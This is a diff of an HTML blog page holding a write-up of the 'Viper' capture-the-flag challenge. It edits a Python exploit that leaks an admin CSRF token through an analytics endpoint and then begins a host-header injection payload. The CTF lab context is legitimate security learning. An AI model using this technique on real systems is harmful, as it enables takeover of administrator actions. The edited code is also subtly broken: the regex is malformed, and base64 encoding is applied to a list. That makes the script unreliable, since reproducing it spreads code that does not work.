@@ -51,7 +51,7 @@ When we create our viper, its name is its viperId, which is a UUID.
 The source code is available for us in this challenge as well. The server&rsquo;s file defines multiple endpoints, but the one that caught my eye immediately was GET /admin/create.">
 <meta itemprop="datePublished" content="2020-07-02T01:56:16-06:00" />
 <meta itemprop="dateModified" content="2020-07-02T01:56:16-06:00" />
-<meta itemprop="wordCount" content="1042">
+<meta itemprop="wordCount" content="1055">
 <meta itemprop="image" content="https://jamvie.net/images/REDPWN2020_ViperHome.png">
 
 
@@ -321,7 +321,12 @@ cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;c
 
 <span style="color:#75715e"># Get csrf </span>
 viper <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(address<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/analytics?ip_address=__csrftoken__admin_account&#34;</span>)
-csrf <span style="color:#f92672">=</span> quote(b64encode(viper<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>encode()))
+<span style="color:#66d9ef">print</span>(viper<span style="color:#f92672">.</span>text)
+viper_page <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(address<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/analytics?ip_address=__csrftoken__admin_account&#34;</span>)
+csrf_token <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;site (\*d) times.&#34;</span>, viper_page<span style="color:#f92672">.</span>text)
+<span style="color:#75715e">#encode in base64</span>
+csrf_token <span style="color:#f92672">=</span> b64encode(csrf_token)
+
 
 <span style="color:#75715e"># Inject host header</span>
 payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
